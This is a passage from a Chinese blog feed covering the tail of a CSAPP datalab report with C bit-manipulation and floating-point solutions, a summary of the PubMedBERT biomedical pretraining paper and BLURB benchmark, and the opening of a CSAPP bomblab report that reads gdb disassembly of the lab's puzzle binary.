<p>首先，为了避免正负数的问题，可以通过右移 + 异或，转换为正数处理。然后如果可以使用分支或者循环，可以逐位判断，找到最高位的 1。但是不允许的情况下，该怎么办呢？</p>
<p>一种直觉的思路是把循环展开，每次移动一位：先判断当前数是否为 0，不为 0 则计数器 + 1，然后右移 1 位。重复 31 次。代码形如：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line">cnt+=!!x;</span><br><span class="line">x&gt;&gt;=<span class="number">1</span>;</span><br><span class="line"><span class="comment">// 重复31次</span></span><br></pre></td></tr></tbody></table></figure>
<p>这样需要至少 4*31 次操作，超出了 90 的限制，显然不是高效的解法。</p>
<p>细想一下，需要返回的结果实际上是一个 5 位数，从 00000 到 11111（31），最后加上符号位即可。因此，相较于低效地在原始的 32 位数字上遍历，<strong>可以逐位地判断结果的每 1 位是否为 1</strong>。从高到低地判断，以最高位 16 为例，流程如下：</p>
<ol type="1">
<li>判断 x&gt;&gt;15 是否为 0</li>
<li> 若是，将结果第 5 位置 1，<code>x&gt;&gt;=16</code></li>
<li>若否，将结果第 5 位置 0</li>
</ol>
<p>在不允许分支的情况下，如何区分两种情况？答案是前面做过的三目运算符，<code>x=(x&gt;&gt;15)==0?x:x&gt;&gt;16</code>，即可完成。代码如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* howManyBits - return the minimum number of bits required to represent x in</span></span><br><span class="line"><span class="comment"> *             two's complement</span></span><br><span class="line"><span class="comment"> *  Examples: howManyBits(12) = 5</span></span><br><span class="line"><span class="comment"> *            howManyBits(298) = 10</span></span><br><span class="line"><span class="comment"> *            howManyBits(-5) = 4</span></span><br><span class="line"><span class="comment"> *            howManyBits(0)  = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(-1) = 1</span></span><br><span class="line"><span class="comment"> *            howManyBits(0x80000000) = 32</span></span><br><span class="line"><span class="comment"> *  Legal ops: ! ~ &amp; ^ | + &lt;&lt; &gt;&gt;</span></span><br><span class="line"><span class="comment"> *  Max ops: 90</span></span><br><span class="line"><span class="comment"> *  Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">howManyBits</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="comment">// 32 = 100000</span></span><br><span class="line">  <span class="comment">// 31 = 011111</span></span><br><span class="line">  <span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> cond, mask;</span><br><span class="line">  <span class="keyword">int</span> ALL_ONE = ~<span class="number">0</span>;</span><br><span class="line">  <span class="comment">// convert negative to non-negative, -1 -&gt; 0</span></span><br><span class="line">  x ^= x &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="comment">// printf("after converting: %x \n", x);</span></span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">15</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">4</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 15==0?x:x&gt;&gt;16;</span></span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">16</span>));</span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">7</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">3</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">8</span>));</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 7==0?x:x&gt;&gt;8;</span></span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">3</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">2</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 3==0?x:x&gt;&gt;4;</span></span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">4</span>));</span><br><span class="line">  cond = !(x &gt;&gt; <span class="number">1</span>);</span><br><span class="line">  ans |= !cond &lt;&lt; <span class="number">1</span>;</span><br><span class="line">  mask = ALL_ONE + cond;</span><br><span class="line">  <span class="comment">// x = x &gt;&gt; 1==0?x:x&gt;&gt;2;</span></span><br><span class="line">  x = (~mask &amp; x) | (mask &amp; (x &gt;&gt; <span class="number">2</span>));</span><br><span class="line">  <span class="comment">// last one</span></span><br><span class="line">  <span class="comment">// printf("last one: %x,%x\n", x, ans);</span></span><br><span class="line">  ans |= x;</span><br><span class="line">  <span class="keyword">return</span> ans + <span class="number">1</span>;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="浮点数">浮点数</h2>
<h3 id="floatscale2">floatScale2</h3>
<p>将浮点数 * 2。不难，分析得到各个位的取值后，分别判断规格数、非规格数、特殊值三种情况即可。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">//float</span></span><br><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatScale2 - Return bit-level equivalent of expression 2*f for</span></span><br><span class="line"><span class="comment"> *   floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Both the argument and result are passed as unsigned int's, but</span></span><br><span class="line"><span class="comment"> *   they are to be interpreted as the bit-level representation of</span></span><br><span class="line"><span class="comment"> *   single-precision floating point values.</span></span><br><span class="line"><span class="comment"> *   When argument is NaN, return argument</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatScale2</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>{</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> mMask = (<span class="number">1</span> &lt;&lt; <span class="number">23</span>) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> m = uf &amp; mMask;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">if</span> (frac == <span class="number">0xff</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> uf;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (frac == <span class="number">0</span>)</span><br><span class="line">  {</span><br><span class="line">    m &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    frac += <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> (sign &lt;&lt; <span class="number">31</span>) + (frac &lt;&lt; <span class="number">23</span>) + m;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="floatfloat2int">floatFloat2Int</h3>
<p>将浮点数转为 int，同样不难。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatFloat2Int - Return bit-level equivalent of expression (int) f</span></span><br><span class="line"><span class="comment"> *   for floating point argument f.</span></span><br><span class="line"><span class="comment"> *   Argument is passed as unsigned int, but</span></span><br><span class="line"><span class="comment"> *   it is to be interpreted as the bit-level representation of a</span></span><br><span class="line"><span class="comment"> *   single-precision floating point value.</span></span><br><span class="line"><span class="comment"> *   Anything out of range (including NaN and infinity) should return</span></span><br><span class="line"><span class="comment"> *   0x80000000u.</span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. also if, while</span></span><br><span class="line"><span class="comment"> *   Max ops: 30</span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">floatFloat2Int</span><span class="params">(<span class="keyword">unsigned</span> uf)</span> </span>{</span><br><span class="line">  <span class="keyword">unsigned</span> sign = uf &gt;&gt; <span class="number">31</span>;</span><br><span class="line">  <span class="keyword">int</span> mMask = (<span class="number">1</span> &lt;&lt; <span class="number">23</span>) - <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">unsigned</span> m = uf &amp; mMask;</span><br><span class="line">  <span class="keyword">unsigned</span> frac = (uf &gt;&gt; <span class="number">23</span>) &amp; <span class="number">0xff</span>;</span><br><span class="line">  <span class="keyword">int</span> <span class="built_in">exp</span> = frac - <span class="number">127</span>;</span><br><span class="line">  <span class="keyword">if</span> (frac == <span class="number">0xff</span> || <span class="built_in">exp</span> &gt;= <span class="number">31</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">1</span> &lt;&lt; <span class="number">31</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt; <span class="number">0</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  m += <span class="number">1</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  <span class="keyword">if</span> (<span class="built_in">exp</span> &lt;= <span class="number">23</span>)</span><br><span class="line">  {</span><br><span class="line">    m &gt;&gt;= <span class="number">23</span> - <span class="built_in">exp</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    m &lt;&lt;= <span class="built_in">exp</span> - <span class="number">23</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (sign)</span><br><span class="line">  {</span><br><span class="line">    m = ~m + <span class="number">1</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> m;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h3 id="floatpower2">floatPower2</h3>
<p>实现求 2 的幂的功能。重点在于判断特殊情况，下溢为 0，上溢为无穷，规格数还是非规格数等。</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment"> * floatPower2 - Return bit-level equivalent of the expression 2.0^x</span></span><br><span class="line"><span class="comment"> *   (2.0 raised to the power x) for any 32-bit integer x.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> *   The unsigned value that is returned should have the identical bit</span></span><br><span class="line"><span class="comment"> *   representation as the single-precision floating-point number 2.0^x.</span></span><br><span class="line"><span class="comment"> *   If the result is too small to be represented as a denorm, return</span></span><br><span class="line"><span class="comment"> *   0. If too large, return +INF.</span></span><br><span class="line"><span class="comment"> * </span></span><br><span class="line"><span class="comment"> *   Legal ops: Any integer/unsigned operations incl. ||, &amp;&amp;. Also if, while </span></span><br><span class="line"><span class="comment"> *   Max ops: 30 </span></span><br><span class="line"><span class="comment"> *   Rating: 4</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="title">floatPower2</span><span class="params">(<span class="keyword">int</span> x)</span> </span>{</span><br><span class="line">  <span class="keyword">unsigned</span> frac, m;</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-149</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (x &gt; <span class="number">127</span>)</span><br><span class="line">  {</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0xff</span> &lt;&lt; <span class="number">23</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">if</span> (x &lt; <span class="number">-126</span>)</span><br><span class="line">  {</span><br><span class="line">    frac = <span class="number">0</span>;</span><br><span class="line">    m = <span class="number">1</span> &lt;&lt; (<span class="number">149</span> + x);</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  {</span><br><span class="line">    frac = x + <span class="number">127</span>;</span><br><span class="line">    m = <span class="number">0</span>;</span><br><span class="line">  }</span><br><span class="line">  <span class="keyword">return</span> (frac &lt;&lt; <span class="number">23</span>) + m;</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="结果">结果</h2>
<p>使用./driver.pl 对正确性和性能进行评估。拿到了全部的正确性和性能分数，受时间限制没有对每个函数内的操作数细扣优化，感觉有些地方还是有优化空间的。</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Correctness Results     Perf Results</span><br><span class="line">Points  Rating  Errors  Points  Ops     Puzzle</span><br><span class="line">1       1       0       2       7       bitXor</span><br><span class="line">1       1       0       2       1       tmin</span><br><span class="line">1       1       0       2       9       isTmax</span><br><span class="line">2       2       0       2       9       allOddBits</span><br><span class="line">2       2       0       2       2       negate</span><br><span class="line">3       3       0       2       12      isAsciiDigit</span><br><span class="line">3       3       0       2       7       conditional</span><br><span class="line">3       3       0       2       15      isLessOrEqual</span><br><span class="line">4       4       0       2       11      logicalNeg</span><br><span class="line">4       4       0       2       49      howManyBits</span><br><span class="line">4       4       0       2       14      floatScale2</span><br><span class="line">4       4       0       2       21      floatFloat2Int</span><br><span class="line">4       4       0       2       11      floatPower</span><br><span class="line"></span><br><span class="line">Score = 62/62 [36/36 Corr + 26/26 Perf] (168 total operators)</span><br></pre></td></tr></tbody></table></figure>
]]></content>
      <categories>
        <category>学习笔记</category>
        <category>体系结构</category>
        <category>csapp</category>
        <category>实验报告</category>
      </categories>
      <tags>
        <tag>学习笔记</tag>
        <tag>体系结构</tag>
        <tag>csapp</tag>
        <tag>实验报告</tag>
      </tags>
  </entry>
  <entry>
    <title>ACM 2021: 生物医学域的语言模型</title>
    <url>/blog/2022/04/10/Biomedical-LM/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>《Domain-Specific Language Model Pretraining for Biomedical Natural
Language Processing》为微软研究院发表的论文，收录于 2021 年
ACM 中。论文旨在探讨，特定领域的预训练也可以从通用领域语言模型开始受益，这一假设是否适用于具有大规模未标记数据的领域（例如生物医学）。论文证实，相较于从通用领域继续预训练，从头开始训练预训练模型能够获得更好的性能。此外，论文还提出了一个新的生物医学 NLP 基准 BLURB，并创建了排行榜。</p>
<span id="more"></span>
<h2 id="介绍">介绍</h2>
<p>NLP 中，在未标记文本上自监督地训练预训练模型，加之以目标域微调，已经被证实为是行之有效的迁移学习策略，尤其是在目标域数据稀缺、源域和目标域高度相关的情况下。尚不清楚特定领域的预训练是否可以从通用领域的迁移中受益。在生物医学领域，已有的工作表明使用域内文本可以提供超过通用域语言模型的额外收益。然而，这些工作都基于一个普遍的假设 -- 域外文本依然是有用的，并且通常采用混合域方法，例如，通过从现有的通用域语言模型开始特定域的预训练。</p>
<h3 id="混合域方法">混合域方法</h3>
<p>混合域方法如下图上半部分所示。基于在互联网、维基百科等预训练得到的通用语言模型，继续进行特定域的预训练。</p>
<p><img src="comparison.png"></p>
<p>然而，这种方法存在以下问题：</p>
<ul>
<li><strong>文本差异</strong>。生物医学领域的文本和通用域文本有较大差异，混合域方法增加了负迁移的可能性。</li>
<li><strong>词表差距</strong>。目标域与通用域的词表差距较大。以 BERT 为例，BERT 的词表是从
Wikipedia 和 BookCorpus
生成的，这与生物医学域的词汇差距较大。例如 "naloxone" 一词（纳洛酮），医学里的常用名词，在 BERT 中被拆为四块：[na,
##lo, ##xon, ##e]</li>
</ul>
<h3 id="从头开始训练">从头开始训练</h3>
<p>上图的下半部分是从头开始进行特定域的预训练的例子（train from
scratch）。from
scratch 是从头开始的意思，引申一下就是不使用预训练模型，从头开始训练。</p>
<p>如果目标域本身的文本很少，则混合域预训练方法是有意义的，因为可以从使用相关领域的预训练中受益。但是，生物医学并非如此，它在
PubMed 中拥有超过 3000
万个摘要。因此，从头开始的特定领域预训练可能是更好的训练策略。它的优点有：</p>
<ul>
<li><strong>域内数据</strong>。使用的数据全部来自域内，不受其他领域文本的影响。</li>
<li><strong>域内词表</strong>。不受通用域词表限制。</li>
<li><strong>随机初始化</strong>。神经网络训练使用非凸优化，这意味着<strong>持续的预训练可能无法从通用域语言模型中完全撤消次优初始化</strong>。</li>
</ul>
<p>论文实验表明，在生物医学领域，从头开始的特定领域预训练大大优于通用语言模型的继续预训练，从而证明支持混合领域预训练的普遍假设并不总是适用。</p>
<p>此外，论文在提出了一个生物医学语言理解和推理基准 BLURB（Biomedical
Language Understanding &amp; Reasoning
Benchmark），并在 https://aka.ms/BLURB 创建了排行榜。基准中包含：命名实体识别（NER）、循证医学信息提取（PICO）、关系抽取、句子相似度、文档分类、问答等子任务。将子任务得分加权后得到总分数。</p>
<p>BLURB 涉及到的任务类型、数据规模和评估指标如下表所示。</p>
<p><img src="task-intro.png"></p>
<h2 id="方法">方法</h2>
<p>采用<strong>预训练 + 特定任务微调</strong>的范式： ### 模型设置</p>
<ul>
<li>词表：Word Piece 子词模型</li>
<li>预训练任务包含下局预测（NSP）任务，以便与 BERT 比较</li>
<li>全词掩码 (WWM)，掩码率为 15%</li>
<li> 数据集：PubMed5 摘要，包含 1400 万个摘要，32 亿个单词，21 GB。</li>
</ul>
<h3 id="特定任务微调">特定任务微调</h3>
<p>从同一个预训练 BERT 开始，按照下图的架构，依次执行</p>
<ul>
<li><strong>输入转换</strong>：转换为任务所需的输入。例如关系抽取任务中，需要用特殊符号替换实体词；QA 中需要加入特殊分隔符等。</li>
<li><strong>模型计算</strong>：得到编码向量。</li>
<li><strong>特征抽取</strong>：从向量中选择任务所需的特征。例如，分类任务取 [CLS] 符号的表征向量，NER 取每个 token 的表征向量。</li>
<li><strong>预测</strong>：根据任务 + 特征进行预测。例如，NER 使用线性层 / LSTM/CRF 进行分类，句子相似度使用线性层执行回归等。</li>
</ul>
<p><img src="task-specific-finetune.png"></p>
<p>BLURB 中的六个任务可分别定义为 token / 句子级别的分类 / 回归任务，如下表所示。</p>
<p><img src="tasks.png"></p>
<h2 id="实验">实验</h2>
<h3 id="基线模型">基线模型</h3>
<p>实验涉及到的一些基线模型如下：</p>
<p><img src="baselines.png"></p>
<p>其中，SciBERT
是使用生物医学和计算机科学的数据，从头开始生成词汇和预训练。
然而，从生物医学应用的角度来看，SciBERT
仍然采用混合域预训练方法，因为计算机科学文本显然是域外的。<code>Wiki +
Books</code> 的词表，即 BERT 的词表，意味着模型都是从 BERT 继续预训练的。</p>
<p>可以看到，除了本文的 <code>PubMedBERT</code>，其他模型都是混合域训练的方法。</p>
<h3 id="实验结果">实验结果</h3>
<p>BLURB 上的结果如下表所示，其中所有的 BERT 模型都经过了相同的微调过程。通过从头开始进行特定领域的预训练，PubMedBERT
在大多数生物医学 NLP 任务中明显优于其他 BERT 模型。与使用域外文本训练的
BERT 模型相比，收益最为显着。</p>
<p><img src="overview-result.png"></p>
<h3 id="消融实验">消融实验</h3>
<h4 id="词表">词表</h4>
<p>针对两种词表 &amp; 两种掩码方式，论文使用
PubMedBERT 进行了消融实验。换而言之，两边的预训练方法都是从头开始的，不过是词表和掩码方式有所差异。结果如下表。可以看出，全词掩码是明显优于普通掩码的。从 PubMed 构建的词表在大多数任务上都是优于原始 BERT 的词表的。</p>
<p><img src="vocab-wwm.png"></p>
<p>从词表将句子编码后的平均长度也可以看出来，如下表，可以看出 PubMed 构建的词表的句子平均长度更短，在 QA 上达到了上百的差异。这里也可以看出，原始的 BERT 的词表在 BioASQ 任务上的 tokenize 后的平均句子长度为 <strong>702.4&gt;512，句子被截断了</strong>，怪不得在这个数据集上跟 PubMedBERT 差了十几个点。。。</p>
<p><img src="vocab-length.png"></p>
<h4 id="预训练方法">预训练方法</h4>
<p>下表展示了预训练预料、训练时间对性能的影响。前两列均使用从通用语料 + 生物医学语料混合域预训练的方法，不过词表不同。两列性能比较互有来回，猜测是由于只根据单一域构建词表，混合域预训练性能受限，与只训练一半时间的 PubMed 类似。</p>
<p><img src="ptr-method.png"></p>
<p><strong>对抗预训练</strong></p>
<p>结果如下表所示。对抗预训练还损害了性能。作者认为可能是由于域内语料类别单一，如果预训练语料库更加多样化且相对域外，则对抗性训练更有用。</p>
<p><img src="adversial.png"></p>
<h3 id="微调方法">微调方法</h3>
<p>以 NER、关系抽取为例，在 BERT 之前，都是使用 LSTM 和 CRF 进行标注。由于 BERT 横扫榜单，这种显式建模方法的实用性遭到了质疑。BERT
模型的顶层已经捕获了整个文本范围内的许多非线性依赖关系。直接进行分类也可以取得很好的效果。在下表中（F1 分数）也可以看出，线性层对在 5 个数据集上都取得了最优。而且线性层是可并行的，LSTM 还要引入额外的串行开销。</p>
<p><img src="ner-ablation.png"></p>
<p><strong>关系抽取中的虚拟化方法和关系编码的影响</strong>。虚拟化（dummify）方法是指在关系抽取中，为了防止过拟合，往往使用特殊符号（例如 $DRUG 和 $GENE）替换实体词。关系编码是指用于关系分类的向量，例如 [CLS] 或者特殊实体开始标记。</p>
<p>论文对关系编码的三种方法：[CLS]、实体词向量的最大池化、实体首符号的向量，以及输入实体符号的方法：虚拟化、原始文本、在实体前后添加标记进行了比较实验。结果如下表所示。简单地使用原始文本确实会使神经方法面临过拟合风险。对原始文本使用
[CLS]
是最糟糕的选择，因为很难判定要抽取哪两个实体间的关系。虚拟化仍然是最可靠的方法，它适用于任何一种关系编码方法。有趣的是，使用实体标记会在两个数据集中产生稍好的结果，因为它似乎可以防止过度拟合，同时保留有用的实体信息。</p>
<p><img src="relation-extraction.png"></p>
<h2 id="总结">总结</h2>
<p>这篇论文研究了” 通用域预训练模型，对于拥有大量未标记文本的特定域的迁移学习，是否有效 “的问题。在生物医学领域的实验表明，从头开始训练（train
from
scratch）是更好的选择。论文中还做了非常详细的消融实验，逐个探究词表、训练数据等的影响。</p>
]]></content>
      <categories>
        <category>自然语言处理</category>
        <category>预训练模型</category>
      </categories>
      <tags>
        <tag>BERT</tag>
        <tag>迁移学习</tag>
        <tag>生物医学</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-Lab-2 实验报告: bomblab</title>
    <url>/blog/2023/05/04/CSAPP-Lab-2/</url>
    <content><![CDATA[<h2 id="摘要">摘要</h2>
<p>本文介绍了笔者在做 bomblab 一节的实验报告。该 lab 要求通过 gdb 等工具，调试二进制执行文件，阅读理解汇编指令，并找到避免炸弹的正确口令，阻止炸弹爆炸。</p>
<span id="more"></span>
<h2 id="phase-1">phase 1</h2>
<p>首先，通过阅读代码，可以发现 <code>phase_1</code> 这个函数内对读取的口令进行检查，如果函数正确退出，则拆弹完成。使用 <code>gdb</code> 对该函数反汇编可以得到如下</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_1:</span><br><span class="line">   0x0000000000400ee0 &lt;+0&gt;:     sub    $0x8,%rsp</span><br><span class="line">   0x0000000000400ee4 &lt;+4&gt;:     mov    $0x402400,%esi</span><br><span class="line">   0x0000000000400ee9 &lt;+9&gt;:     callq  0x401338 &lt;strings_not_equal&gt;</span><br><span class="line">   0x0000000000400eee &lt;+14&gt;:    test   %eax,%eax</span><br><span class="line">   0x0000000000400ef0 &lt;+16&gt;:    je     0x400ef7 &lt;phase_1+23&gt;</span><br><span class="line">   0x0000000000400ef2 &lt;+18&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400ef7 &lt;+23&gt;:    add    $0x8,%rsp</span><br><span class="line">   0x0000000000400efb &lt;+27&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以发现，核心是通过 <code>strings_not_equal</code> 比较口令与 0x402400 地址的字符串是否相同，若不同则引发爆炸。虽然直觉上可以这么理解，但验证正确需要更谨慎一点，需要确认：</p>
<ul>
<li><code>strings_not_equal</code> 是不是如其名，判断字符串相同</li>
<li><code>strings_not_equal</code> 的返回值，是否 0 代表相同</li>
</ul>
<p>详细的确认需要逐句读汇编，也可以简单确认一下，直接在 <code>0x0000000000400eee</code> 处打断点。输入时输入 0x402400 地址对应的字符串，观察<span class="math inline"> \(eax\)</span> 的值即可。测试发现即可直接通过，可以节省阅读汇编的时间。</p>
<h2 id="phase-2">phase 2</h2>
<p>难度略微加大。同样地，首先反汇编 <code>phase_2</code>，结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function phase_2:</span><br><span class="line">   0x0000000000400efc &lt;+0&gt;:     push   %rbp</span><br><span class="line">   0x0000000000400efd &lt;+1&gt;:     push   %rbx</span><br><span class="line">   0x0000000000400efe &lt;+2&gt;:     sub    $0x28,%rsp</span><br><span class="line">   0x0000000000400f02 &lt;+6&gt;:     mov    %rsp,%rsi</span><br><span class="line">   0x0000000000400f05 &lt;+9&gt;:     callq  0x40145c &lt;read_six_numbers&gt;</span><br><span class="line">   0x0000000000400f0a &lt;+14&gt;:    cmpl   $0x1,(%rsp)</span><br><span class="line">   0x0000000000400f0e &lt;+18&gt;:    je     0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f10 &lt;+20&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f15 &lt;+25&gt;:    jmp    0x400f30 &lt;phase_2+52&gt;</span><br><span class="line">   0x0000000000400f17 &lt;+27&gt;:    mov    -0x4(%rbx),%eax</span><br><span class="line">   0x0000000000400f1a &lt;+30&gt;:    add    %eax,%eax</span><br><span class="line">   0x0000000000400f1c &lt;+32&gt;:    cmp    %eax,(%rbx)</span><br><span class="line">   0x0000000000400f1e &lt;+34&gt;:    je     0x400f25 &lt;phase_2+41&gt;</span><br><span class="line">   0x0000000000400f20 &lt;+36&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000400f25 &lt;+41&gt;:    add    $0x4,%rbx</span><br><span class="line">   0x0000000000400f29 &lt;+45&gt;:    cmp    %rbp,%rbx</span><br><span class="line">   0x0000000000400f2c &lt;+48&gt;:    jne    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f2e &lt;+50&gt;:    jmp    0x400f3c &lt;phase_2+64&gt;</span><br><span class="line">   0x0000000000400f30 &lt;+52&gt;:    lea    0x4(%rsp),%rbx</span><br><span class="line">   0x0000000000400f35 &lt;+57&gt;:    lea    0x18(%rsp),%rbp</span><br><span class="line">   0x0000000000400f3a &lt;+62&gt;:    jmp    0x400f17 &lt;phase_2+27&gt;</span><br><span class="line">   0x0000000000400f3c &lt;+64&gt;:    add    $0x28,%rsp</span><br><span class="line">   0x0000000000400f40 &lt;+68&gt;:    pop    %rbx</span><br><span class="line">   0x0000000000400f41 &lt;+69&gt;:    pop    %rbp</span><br><span class="line">   0x0000000000400f42 &lt;+70&gt;:    retq</span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到，核心是调用了 <code>read_six_numbers</code> 函数，这个函数需要两个参数，第一个是 <code>read_line</code> 得到的字符串，存储在 <code>rdi</code> 中没有被修改，第二个是 <code>rsi</code>，在栈 <code>rsp</code> 上开辟了 0x28 的空间，猜测应该是一个大小为 10 的 int 数组。同时观察到后续没有使用 <code>eax</code> 的逻辑，这个函数应该是无返回值的。接着反汇编 <code>read_six_numbers</code>，结果如下：</p>
<figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">Dump of assembler code for function read_six_numbers:</span><br><span class="line">   0x000000000040145c &lt;+0&gt;:     sub    $0x18,%rsp</span><br><span class="line">   0x0000000000401460 &lt;+4&gt;:     mov    %rsi,%rdx</span><br><span class="line">   0x0000000000401463 &lt;+7&gt;:     lea    0x4(%rsi),%rcx</span><br><span class="line">   0x0000000000401467 &lt;+11&gt;:    lea    0x14(%rsi),%rax</span><br><span class="line">   0x000000000040146b &lt;+15&gt;:    mov    %rax,0x8(%rsp)</span><br><span class="line">   0x0000000000401470 &lt;+20&gt;:    lea    0x10(%rsi),%rax</span><br><span class="line">   0x0000000000401474 &lt;+24&gt;:    mov    %rax,(%rsp)</span><br><span class="line">   0x0000000000401478 &lt;+28&gt;:    lea    0xc(%rsi),%r9</span><br><span class="line">   0x000000000040147c &lt;+32&gt;:    lea    0x8(%rsi),%r8</span><br><span class="line">   0x0000000000401480 &lt;+36&gt;:    mov    $0x4025c3,%esi</span><br><span class="line">   0x0000000000401485 &lt;+41&gt;:    mov    $0x0,%eax</span><br><span class="line">   0x000000000040148a &lt;+46&gt;:    callq  0x400bf0 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">   0x000000000040148f &lt;+51&gt;:    cmp    $0x5,%eax</span><br><span class="line">   0x0000000000401492 &lt;+54&gt;:    jg     0x401499 &lt;read_six_numbers+61&gt;</span><br><span class="line">   0x0000000000401494 &lt;+56&gt;:    callq  0x40143a &lt;explode_bomb&gt;</span><br><span class="line">   0x0000000000401499 &lt;+61&gt;:    add    $0x18,%rsp</span><br><span class="line">   0x000000000040149d &lt;+65&gt;:    retq   </span><br><span class="line">End of assembler dump.</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到核心逻辑在 + 54 附近，对<code>__isoc99_sscanf@plt</code> 的返回值进行校验，如果不满足 <code>&gt;5</code>，则引爆炸弹。sscanf 的函数签名如下：</p>
<figure class="highlight c"><table><tbody><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sscanf</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span> *str, <span class="keyword">const</span> <span class="keyword">char</span> *format, ...)</span></span></span><br></pre></td></tr></tbody></table></figure>
<p>即从 str 读取格式化输入，返回成功匹配和赋值的个数。打印 0x4025c3 处的模板字符串可知，格式为 "% d
% d % d % d % d
